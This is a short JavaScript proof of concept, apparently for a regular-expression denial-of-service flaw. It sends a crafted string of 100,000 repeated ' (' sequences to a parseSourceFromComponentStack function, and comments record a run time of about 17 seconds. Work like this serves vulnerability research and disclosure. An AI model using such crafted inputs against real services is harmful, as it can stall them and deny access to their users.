"use strict";

var _utils = require("./utils.js");
//Attack String :""+" ("*100000+"\u0000"
var str = "at";
for (var i = 0; i < 100000; i++) {
  str += " (";
}
str += ":1";
var result = (0, _utils.parseSourceFromComponentStack)(str);
console.log(result);

// real    0m16.919s
// user    0m16.875s
// sys     0m0.030s